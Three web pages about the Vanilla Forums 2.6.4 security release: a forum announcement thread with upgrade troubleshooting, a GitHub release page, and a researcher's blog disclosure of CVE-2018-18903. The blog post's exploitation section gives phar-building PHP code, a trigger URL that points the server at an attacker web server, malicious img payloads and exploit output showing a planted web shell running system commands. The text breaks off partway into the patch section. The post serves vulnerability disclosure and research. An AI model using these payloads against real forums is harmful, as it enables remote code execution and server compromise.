=== Content from open.vanillaforums.com_c7fdae55_20250125_224452.html ===


[![Vanilla Forums](https://us.v-cdn.net/5018160/uploads/fb3af9601a44d13eb2b42f9e02fe924b.png)](/)

[Blog](https://vanilla.higherlogic.com/blog/)
[Documentation](https://docs.vanillaforums.com)
[Book a Demo](https://www.higherlogic.com/vanilla-demo-request/)

toggle menu

[Categories](/categories)

[Discussions](/discussions)

[Activity](/activity)

[Best Of...](/bestof/everything)

[![Vanilla Forums](https://us.v-cdn.net/5018160/uploads/e13bbf06962e8f4b2aa2eb2b0b0edbc7.png)](/)
[Sign In](/entry/signin?Target=discussion%2F36771%2Fsecurity-update-vanilla-2-6-4) · [Register](/entry/register?Target=discussion%2F36771%2Fsecurity-update-vanilla-2-6-4)

[Sign In](/entry/signin?Target=discussion%2F36771%2Fsecurity-update-vanilla-2-6-4) · [Register](/entry/register?Target=discussion%2F36771%2Fsecurity-update-vanilla-2-6-4)

[Categories](/categories)

[Discussions](/discussions)

[Activity](/activity)

[Best Of...](/bestof/everything)

[Sign In](/entry/signin?Target=discussion%2F36771%2Fsecurity-update-vanilla-2-6-4) · [Register](/entry/register?Target=discussion%2F36771%2Fsecurity-update-vanilla-2-6-4)
×

[Home](https://open.vanillaforums.com/)› [Releases](https://open.vanillaforums.com/categories/blog)

Discussion
 Security update: Vanilla 2.6.4

Author

Date within
1 day
3 days
1 week
2 weeks
1 month
2 months
6 months
1 year
 of
 Examples: Monday, today, last week, Mar 26, 3/26/04
Search

**HackerOne users**: Testing against this community violates our program's Terms of Service and will result in your **bounty being denied**.
# Security update: Vanilla 2.6.4

[![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)
Admin

[October 2018](https://open.vanillaforums.com/discussion/36771/security-update-vanilla-2-6-4)
 edited October 2018   in [Releases](https://open.vanillaforums.com/categories/blog)

Get it here: <https://open.vanillaforums.com/addon/vanilla-core>

This release includes 5 security patches disclosed thru our HackerOne bounty campaign. They include fixes for:

* A remote code execution exploitable only by admins.
* Two XSS vectors in different parts of the Dashboard.
* An XSS vector in the OpenID addon (must be enabled) caused by old debug code.

We also made it more difficult to maliciously change a user's email by removing the cooldown period on prompting for your password when an email change is requested.

**Warning**: If you have any addons (themes or plugins) in your forum install with an **invalid key**, you will get an error on upgrade and will need to physically delete them from your installation. Fixing them is relatively painless, but a topic for elsewhere. We no longer allow invalid keys due to one of the security vulnerabilities above.

Please upgrade to the latest version of Vanilla as soon as possible. No other changes from 2.6.3 are in this version.

4

## Comments

* [![pioc34](https://us.v-cdn.net/5018160/uploads/userpics/512/n80AYDCO8EF7H.jpg)](https://open.vanillaforums.com/profile/pioc34 "pioc34")[pioc34](https://open.vanillaforums.com/profile/pioc34)

  ✭✭

  [October 2018](/discussion/comment/254587/#Comment_254587)

  little problem, there are \_config.php and bootstrap.early.php files in /conf folder and they update config.php files... I removed them and everything's ok.

  3
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [October 2018](/discussion/comment/254590/#Comment_254590)
   edited October 2018

  > [@pioc34](https://open.vanillaforums.com/profile/pioc34) said:
  >
  > little problem, there are \_config.php and bootstrap.early.php files in /conf folder and they update config.php files... I removed them and everything's ok.

  I've replaced the download as of 5 minutes ago. Thanks for the heads up.

  Roll back to the backup of your config.php as well.

  Apparently there is a new bug in our build process we need to address.

  1
* [![korelstar](https://us.v-cdn.net/5018160/uploads/userpics/048/nSLO7UQO540CR.png)](https://open.vanillaforums.com/profile/korelstar "korelstar")[korelstar](https://open.vanillaforums.com/profile/korelstar)

  ✭

  [October 2018](/discussion/comment/254595/#Comment_254595)

  It appears that there are unwanted files in the `uploads` folder, too. I hope that removing them is safe.

  1
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [October 2018](/discussion/comment/254596/#Comment_254596)

  > [@korelstar](https://open.vanillaforums.com/profile/korelstar) said:
  >
  > It appears that there are unwanted files in the `uploads` folder, too. I hope that removing them is safe.

  It is. Thanks for letting us know.

  1
* [![rossum](https://secure.gravatar.com/avatar/1287d585031d711afbe42bd75814d19a/?default=https%3A%2F%2Fvanillicon.com%2Ff781f6b117781826cabf52136fc6183c_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/rossum "rossum")[rossum](https://open.vanillaforums.com/profile/rossum)

  New

  [October 2018](/discussion/comment/254599/#Comment_254599)

  Pushed the button via Softaculous in Cpanel, painless thus far.

  1
* [![mauwiks](https://pbs.twimg.com/profile_images/778560608203485184/UnarCpnp_normal.jpg)](https://open.vanillaforums.com/profile/mauwiks "mauwiks")[mauwiks](https://open.vanillaforums.com/profile/mauwiks)

  New

  [October 2018](/discussion/comment/254603/#Comment_254603)

  Do I still have to back up my "default.master.tpl" again to preserve my customization for desktop and mobile when I update to this version? I have installed the HTML Editor already. Would it not preserve the customization I made?

  0
* [![Ivan_Gurin](https://us.v-cdn.net/5018160/uploads/userpics/322/nFRZ3CAHJXPGI.jpg)](https://open.vanillaforums.com/profile/Ivan_Gurin "Ivan_Gurin")[Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin)

  ✭

  [October 2018](/discussion/comment/254606/#Comment_254606)
   edited October 2018

  I have a problem after update. What do I have to do to fix it?
  ![](https://us.v-cdn.net/5018160/uploads/editor/1c/mvc6bs6oa23m.png)

  0
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [October 2018](/discussion/comment/254607/#Comment_254607)

  > [@Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin) said:
  >
  > I have a problem after update. What do I have to do to fix it?
  > ![](https://us.v-cdn.net/5018160/uploads/editor/1c/mvc6bs6oa23m.png)

  It sounds like one of your addons has an invalid key in its info. I suggest disabling your third-party addons and investigating their `addon.json` (new style) or the key of the `$PluginInfo` array in the main plugin file (old style).

  0
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [October 2018](/discussion/comment/254608/#Comment_254608)

  > [@mauwiks](https://open.vanillaforums.com/profile/mauwiks) said:
  >
  > Do I still have to back up my "default.master.tpl" again to preserve my customization for desktop and mobile when I update to this version? I have installed the HTML Editor already. Would it not preserve the customization I made?

  You should create a new theme containing that file, then select that theme in the Dashboard.

  If you have customized a core Vanilla file directly, then yes, you'd need to beware of that during every upgrade (which is why a simple theme is the correct way to do this).

  1
* [![Ivan_Gurin](https://us.v-cdn.net/5018160/uploads/userpics/322/nFRZ3CAHJXPGI.jpg)](https://open.vanillaforums.com/profile/Ivan_Gurin "Ivan_Gurin")[Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin)

  ✭

  [October 2018](/discussion/comment/254610/#Comment_254610)

  > [@Linc](https://open.vanillaforums.com/profile/Linc) said:
  >
  > > [@Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin) said:
  > >
  > > I have a problem after update. What do I have to do to fix it?
  > > ![](https://us.v-cdn.net/5018160/uploads/editor/1c/mvc6bs6oa23m.png)
  >
  > It sounds like one of your addons has an invalid key in its info. I suggest disabling your third-party addons and investigating their `addon.json` (new style) or the key of the `$PluginInfo` array in the main plugin file (old style).

  I've left only original plugins from core vanilla file and cleared cache, but it still has the error ![:(](https://open.vanillaforums.com/plugins/emojiextender/emoji/little/frown.png ":(")

  0
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [October 2018](/discussion/comment/254612/#Comment_254612)

  > [@Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin) said:
  >
  > I've left only original plugins from core vanilla file and cleared cache, but it still has the error ![:(](https://open.vanillaforums.com/plugins/emojiextender/emoji/little/frown.png ":(")

  Interesting. Then I'd go a step further and delete non-original plugins from your `/plugins` folder.

  0
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [October 2018](/discussion/comment/254613/#Comment_254613)

  I've added a warning to the announcement above regarding invalid addon keys. Clearly we didn't realize so many corrupt addons were out there.

  0
* [![mauwiks](https://pbs.twimg.com/profile_images/778560608203485184/UnarCpnp_normal.jpg)](https://open.vanillaforums.com/profile/mauwiks "mauwiks")[mauwiks](https://open.vanillaforums.com/profile/mauwiks)

  New

  [October 2018](/discussion/comment/254615/#Comment_254615)
   edited October 2018

  > [@Linc](https://open.vanillaforums.com/profile/Linc) said:
  >
  > > [@mauwiks](https://open.vanillaforums.com/profile/mauwiks) said:
  > >
  > > Do I still have to back up my "default.master.tpl" again to preserve my customization for desktop and mobile when I update to this version? I have installed the HTML Editor already. Would it not preserve the customization I made?
  >
  > You should create a new theme containing that file, then select that theme in the Dashboard.
  >
  > If you have customized a core Vanilla file directly, then yes, you'd need to beware of that during every upgrade (which is why a simple theme is the correct way to do this).

  If you may, could you give some link on how to create a customized theme in a proper way?

  Anyway, I just upgraded my Vanilla to the latest version and it seems that I don't need to edit anything anymore. Using a plugin such as HTML Editor made my customization stick from the old version to the new update. Unlike what happened before

  0
* [![Ivan_Gurin](https://us.v-cdn.net/5018160/uploads/userpics/322/nFRZ3CAHJXPGI.jpg)](https://open.vanillaforums.com/profile/Ivan_Gurin "Ivan_Gurin")[Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin)

  ✭

  [October 2018](/discussion/comment/254617/#Comment_254617)

  > [@Linc](https://open.vanillaforums.com/profile/Linc) said:
  >
  > > [@Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin) said:
  > >
  > > I've left only original plugins from core vanilla file and cleared cache, but it still has the error ![:(](https://open.vanillaforums.com/plugins/emojiextender/emoji/little/frown.png ":(")
  >
  > Interesting. Then I'd go a step further and delete non-original plugins from your `/plugins` folder.

  I've deleted all plugins and locales, cleared cache and still have the error.

  1
* [![R_J](https://us.v-cdn.net/5018160/uploads/userpics/892/nKYIPS43WB7I2.png)](https://open.vanillaforums.com/profile/R_J "R_J")[R\_J](https://open.vanillaforums.com/profile/R_J)

  Admin

  [October 2018](/discussion/comment/254618/#Comment_254618)
   edited October 2018

  > [@Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin) said:
  >
  > I have a problem after update. What do I have to do to fix it?

  I just did the upgrade myself and got exactly the same error as you and it took me a while to find out the reason. In the end it was the premium theme "Flat Responsive" because **blanks are not allowed in theme or addon names**.

  You need to rename the folder (just replace the blank with a "\_" character) and you have to edit the about.php of the file and make the PluginInfo exactly the same as the folder name.

  1
* [![Ivan_Gurin](https://us.v-cdn.net/5018160/uploads/userpics/322/nFRZ3CAHJXPGI.jpg)](https://open.vanillaforums.com/profile/Ivan_Gurin "Ivan_Gurin")[Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin)

  ✭

  [October 2018](/discussion/comment/254621/#Comment_254621)
   edited October 2018

  I've written print\_r($key) in private method validateKey and found out that in the method passed parameter as array insted of parameter as string:
  ![](https://us.v-cdn.net/5018160/uploads/editor/6c/epq25cokt9qt.png)

  0
* [![Ivan_Gurin](https://us.v-cdn.net/5018160/uploads/userpics/322/nFRZ3CAHJXPGI.jpg)](https://open.vanillaforums.com/profile/Ivan_Gurin "Ivan_Gurin")[Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin)

  ✭

  [October 2018](/discussion/comment/254622/#Comment_254622)

  I've found problem. In config.php was wired line in plugins section. I deleted it. And now everything is fine.
  ![](https://us.v-cdn.net/5018160/uploads/editor/zg/m1fm3i9246t3.png)

  0
* [![x00](https://us.v-cdn.net/5018160/uploads/userpics/437/n69QMT4SPCAWR.png)](https://open.vanillaforums.com/profile/x00 "x00")[x00](https://open.vanillaforums.com/profile/x00)

  MVP

  [November 2018](/discussion/comment/254647/#Comment_254647)

  [@Linc](https://open.vanillaforums.com/profile/Linc)

  There are a lot of extra personal files in the update like random uploads, MACOSX files

  I understand the haste, in releasing this so no big deal just pointing it out.

  [grep](http://en.wikipedia.org/wiki/Grep) is your friend.

  0
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [November 2018](/discussion/comment/254693/#Comment_254693)
   edited November 2018

  > [@x00](https://open.vanillaforums.com/profile/x00) said:
  >
  > MACOSX files

  Can you specify which ones?

  I'll start a PR to get the `uploads/` contents out of the build plus whatever else you identify.

  0
* [![x00](https://us.v-cdn.net/5018160/uploads/userpics/437/n69QMT4SPCAWR.png)](https://open.vanillaforums.com/profile/x00 "x00")[x00](https://open.vanillaforums.com/profile/x00)

  MVP

  [November 2018](/discussion/comment/254695/#Comment_254695)

  ```
  $ diff -qr 2.6.3 2.6.4 | grep "Only in" | grep -v "2.6.3"
  Only in 2.6.4/conf: .DS_Store
  Only in 2.6.4: __MACOSX
  Only in 2.6.4: uploads

  ```

  [grep](http://en.wikipedia.org/wiki/Grep) is your friend.

  2

[Sign In](/entry/signin?Target=discussion%2F36771%2Fsecurity-update-vanilla-2-6-4%3F) or [Register](/entry/register?Target=discussion%2F36771%2Fsecurity-update-vanilla-2-6-4%3F) to comment.

#### Howdy, Stranger!

It looks like you're new here. Sign in or register to get started.

[Sign In](/entry/signin?Target=discussion%2F36771%2Fsecurity-update-vanilla-2-6-4) [Register](/entry/register?Target=discussion%2F36771%2Fsecurity-update-vanilla-2-6-4)
## Quick Links

* [Categories](/categories)
* [Recent Discussions](/discussions)
* [Activity](/activity)
* [Best Of...](/bestof/everything)
* [Unanswered](/discussions/unanswered)

#### Categories

* [All Categories](/categories)
* 1.3K Development
* [92 Releases](https://open.vanillaforums.com/categories/blog)
* [927 Community Addons & Development](https://open.vanillaforums.com/categories/developers)
* [276 Localization](https://open.vanillaforums.com/categories/localization)
* 3.6K Community Hub
* [108 Tutorials](https://open.vanillaforums.com/categories/tutorials)
* [1K General Banter](https://open.vanillaforums.com/categories/off-topic)
* [1.9K Feedback](https://open.vanillaforums.com/categories/feedback)
* 29.2K Versions
* [845 Vanilla 3.x Help](https://open.vanillaforums.com/categories/vanilla-3-0-help)

#### In this Discussion

* [November 2018 x00](https://open.vanillaforums.com/profile/x00)
* [November 2018 Linc](https://open.vanillaforums.com/profile/Linc)
* [October 2018 Ivan\_Gurin](https://open.vanillaforums.com/profile/Ivan_Gurin)
* [October 2018 R\_J](https://open.vanillaforums.com/profile/R_J)
* [October 2018 mauwiks](https://open.vanillaforums.com/profile/mauwiks)
* [October 2018 rossum](https://open.vanillaforums.com/profile/rossum)
* [October 2018 korelstar](https://open.vanillaforums.com/profile/korelstar)
* [October 2018 pioc34](https://open.vanillaforums.com/profile/pioc34)

[Vanilla](https://www.higherlogic.com/vanilla-demo-request/)

Tired of hosting yourself? Upgrade to the Cloud!

[Learn More](https://www.higherlogic.com/vanilla-demo-request/)

© Vanilla Forums 2025

[Powered By Vanilla](https://vanilla.higherlogic.com/)



=== Content from github.com_252f8d48_20250125_224450.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvanilla%2Fvanilla%2Freleases%2Ftag%2FVanilla_2.6.4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvanilla%2Fvanilla%2Freleases%2Ftag%2FVanilla_2.6.4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=vanilla%2Fvanilla)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[vanilla](/vanilla)
/
**[vanilla](/vanilla/vanilla)**
Public

* [Notifications](/login?return_to=%2Fvanilla%2Fvanilla) You must be signed in to change notification settings
* [Fork
  773](/login?return_to=%2Fvanilla%2Fvanilla)
* [Star
   2.9k](/login?return_to=%2Fvanilla%2Fvanilla)

* [Code](/vanilla/vanilla/tree/Vanilla_2.6.4)
* [Issues
  5](/vanilla/vanilla/issues)
* [Pull requests
  4](/vanilla/vanilla/pulls)
* [Actions](/vanilla/vanilla/actions)
* [Projects
  0](/vanilla/vanilla/projects)
* [Security](/vanilla/vanilla/security)
* [Insights](/vanilla/vanilla/pulse)

Additional navigation options

* [Code](/vanilla/vanilla/tree/Vanilla_2.6.4)
* [Issues](/vanilla/vanilla/issues)
* [Pull requests](/vanilla/vanilla/pulls)
* [Actions](/vanilla/vanilla/actions)
* [Projects](/vanilla/vanilla/projects)
* [Security](/vanilla/vanilla/security)
* [Insights](/vanilla/vanilla/pulse)

1. [Releases](/vanilla/vanilla/releases)
2. [Vanilla\_2.6.4](/vanilla/vanilla/releases/tag/Vanilla_2.6.4)

# Vanilla 2.6.4

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/vanilla/vanilla/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...Vanilla_2.6.4)

 Loading

[View all tags](/vanilla/vanilla/tags)

![@linc](https://avatars.githubusercontent.com/u/117672?s=40&v=4)
[linc](/linc)
released this
29 Oct 02:34

·
[13617 commits](/vanilla/vanilla/compare/Vanilla_2.6.4...master)
to master
since this release

[Vanilla\_2.6.4](/vanilla/vanilla/tree/Vanilla_2.6.4)

[`9f12b22`](/vanilla/vanilla/commit/9f12b221c5287fef0a946a7d056ca414e1e0c8ca)

Announcement: <https://open.vanillaforums.com/discussion/36771/security-update-vanilla-2-6-4>

 Assets
3

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from srcincite.io_d77f8fa4_20250125_224453.html ===

  [![Source Incite](/assets/si.png)](/)    [About](/about/) [Blog](/blog/) [Advisories](/advisories/) [Exploits](/exploits/) [Research](/research/)  [Training](/training/)  [Syllabus](/training/syllabus/) [Prerequisites](/training/prerequisites/) [Challenge](/training/challenge/) [Schedule/Signup](/training/schedule-signup/) [Testimonials](/training/testimonials/) [Faq](/training/faq/)   [Contact](/contact/)
# Old School Pwning with New School Tricks :: Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability

Oct 2, 2018

![Vanilla Forums](/assets/images/old-school-pwning-with-new-school-tricks/vanilla-forums.png "Vanilla Forums")

Since I have been working on bug bounties for a while, I decided to finally take the dive into some vendor specific bounties recently. Some of these are on [HackerOne](https://hackerone.com/vanilla) and for me, this is a huge leap of faith because I am a bit of an old schooler in that I remember a time when security researchers couldn’t trust vendors, especially for judging impact and providing actionable information for their users to patch. After *my* experience with [Vanilla](https://vanillaforums.com/), sadly, my stance is still the same. You simply cannot trust a vendor to provide actionable and accurate information.

TL;DR; I walk through the discovery and exploitation of [CVE-2018-18903](/advisories/src-2018-0030) which is an unauthenticated deserialization vulnerability that can be leveraged for remote code execution. Vanilla provided no CVE and stated this report was resolved without providing a commit hash. Later on, I found out that their [changelog](https://open.vanillaforums.com/discussion/36771/security-update-vanilla-2-6-4) incorrectly states the impact of the vulnerability, provides users absolutely no risk rating and does not credit researchers. Shame!

![A poor advisory by Vanilla](/assets/images/old-school-pwning-with-new-school-tricks/poor-vanilla-advisory.png "A poor advisory by Vanilla")

### Introduction

Vanilla forums is available via their git [repo](https://github.com/vanilla/vanilla) so I simply git cloned the repo and did a `composer install` whilst on the latest Ubuntu server at the time. When browsing Vanilla’s [about page](https://vanillaforums.com/en/about-us/) I noticed an interesting statement:

> …With so many sites competing for attention, a successful community must be engaging and reward member participation. Vanilla provides a modern community platform to organizations who want to improve customer service, increase advocacy, and strengthen brand loyalty…

Let’s talk about customer service…

### Discovering the Vulnerability

After a few days of auditing the source code, I found an interesting function in the `DashboardController` controller in `library/core/functions.general.php` file that was reachable by unauthenticated attackers:

```
class ImportController extends DashboardController {

    ...

    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {      // 0
        $pageInfo = [
            'Url' => $url,
            'Title' => '',
            'Description' => '',
            'Images' => [],
            'Exception' => false
        ];

        try {

            ...

            $request = new ProxyRequest();
            $pageHtml = $request->request([
                'URL' => $url,
                'Timeout' => $timeout,
                'Cookies' => $sendCookies,
                'Redirects' => true,
            ]);                                                                                    // 1

            if (!$request->status()) {
                throw new Exception('Couldn\'t connect to host.', 400);
            }

            $dom = pQuery::parseStr($pageHtml);                                                    // 2
            if (!$dom) {
                throw new Exception('Failed to load page for parsing.');
            }

            ...

            // Page Images
            if (count($pageInfo['Images']) == 0) {
                $images = domGetImages($dom, $url);                                                // 3
                $pageInfo['Images'] = array_values($images);
            }

```

At *[0]* we enter the function via a crafted GET request and then at *[1]* we can trigger an SSRF using an attacker controlled `$url` variable parsed into the `fetchPageInfo` function. This on it’s own is an interesting finding and I reported it; only later to be closed as a duplicate. But of course, that isn’t patched.

Later at *[2]* the code parses the page response using the `pQuery` class into the `dom` variable.

Finally, in this function at *[3]* the code calls the `domGetImages` function with our `$url` and `$dom` which is a 2d array containing the response from our web server. Continuing inside of the `library/core/functions.general.php` file we can see the following code:

```
    function domGetImages($dom, $url, $maxImages = 4) {
        $images = [];
        foreach ($dom->query('img') as $element) {                                      // 4
            $images[] = [
                'Src' => absoluteSource($element->attr('src'), $url),                   // 5
                'Width' => $element->attr('width'),
                'Height' => $element->attr('height'),
            ];
        }

        ...

```

At *[4]* the code looks for a html `<img>` tag within the `dom` variable and at *[5]* it will set the `$images` 2d array with the attackers controlled `src` attribute by calling the `absoluteSource` function. Let’s check that function for clarification:

```
   function absoluteSource($srcPath, $url) {
        // If there is a scheme in the srcpath already, just return it.
        if (!is_null(parse_url($srcPath, PHP_URL_SCHEME))) {                    // 6
            return $srcPath;                                                    // 7
        }

    ...

    }

```

At *[6]* the code parses the attacker controlled `srcPath` using `parse_url` and then at *[7]* the code returns the `$srcPath` if the scheme isn’t empty. Now back in the `domGetImages` function, we see:

```
    function domGetImages($dom, $url, $maxImages = 4) {

        ...

        // Sort by size, biggest one first
        $imageSort = [];
        // Only look at first 4 images (speed!)
        $i = 0;
        foreach ($images as $imageInfo) {
            $image = $imageInfo['Src'];                                                 // 8

            if (strpos($image, 'doubleclick.') != false) {
                continue;
            }

            try {
                if ($imageInfo['Height'] && $imageInfo['Width']) {
                    $height = $imageInfo['Height'];
                    $width = $imageInfo['Width'];
                } else {
                    list($width, $height) = getimagesize($image);                       // 9
                }

```

A loop is happening over all the possible images and at *[8]* the code is extracting the src value from the 2d array and setting the `image` variable. Finally at *[9]* if no height or width properties are set in the `<img>` tag, then the code will attempt a `getimagesize` on the fully controlled path.

This can result in remote code execution.

### Exploitation

Some time ago, long before a [blackhat](https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It%27s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf) paper was written by [Sam Thomas](https://twitter.com/%40_s_n_t), [@orange\_8361](https://twitter.com/orange_8361) [shared](https://rdot.org/forum/showthread.php?t=4379) a technique for triggering deserialization within a phar archive.

I am not going to deep dive into phar or how the technique works because its been explained well by [others](https://blog.ripstech.com/2018/new-php-exploitation-technique/). But essentially, we can set the metadata of a phar archive with an non-instantiated class.

```
$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('...');

// add our object as meta data
$phar->setMetadata(new Gdn_Configuration());
$phar->stopBuffering();

// we rename it now
rename("poc.phar", "poc.jpg");

```

Now, to trigger the bug, we just need to do:

`http://target/index.php?p=/dashboard/utility/fetchPageInfo/http:%2f%2f[attacker-web-server]:9090%2f`

The URL encoding is important for exploitation. Now the attackers web server responds with:

```
<html><body><img src="phar:///var/www/html/uploads/6O51ZT69P0S4.jpg">a</img></body></html>

```

Or, if you exploiting this vulnerability on Windows, you can do:

```
<html><body><img src="phar:////attacker/share/test.phar">a</img></body></html>

```

The exploit I sent to Vanilla uses their own code to upload the image and leak the filename, which was an admin level authenticated feature. Whilst the attack complexity is high it certainly doesn’t mean that this bug is authenticated! Here is the output of my exploit.

```
saturn:~ mr_me$ ./poc.py 172.16.175.143 admin:admin123 172.16.175.1
(+) targeting: http://172.16.175.143
(+) logged in!
(+) uploaded phar!
(+) leaked phar name 6O51ZT69P0S4.jpg!
(+) starting http server...
(!) triggered callback for phar!
(+) triggered a write!
(+) shell at: http://172.16.175.143/?c=phpinfo();

saturn:~ mr_me$ curl -sSG "http://172.16.175.143/?c=system('id');"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
### The patch

The [patch](https://github.com/vanilla/vanilla/commit/7e931112fb31da12e1566f6aa82c3f57cd3e8bcc) is interesting because the developer has also included their test cases against the vulnerable function. So maybe someone can develop their own test cases and bypass the patch!

```
        $r = [
            'root' => ['/foo', 'http://ex.com/bar', 'http://ex.com/foo'],
            'relative' => ['bar', 'http://ex.com/foo', 'http://ex.com/foo/bar'],
            'relative slash' => ['bar', 'http://ex.com/foo/', 'http://ex.com/foo/bar'],
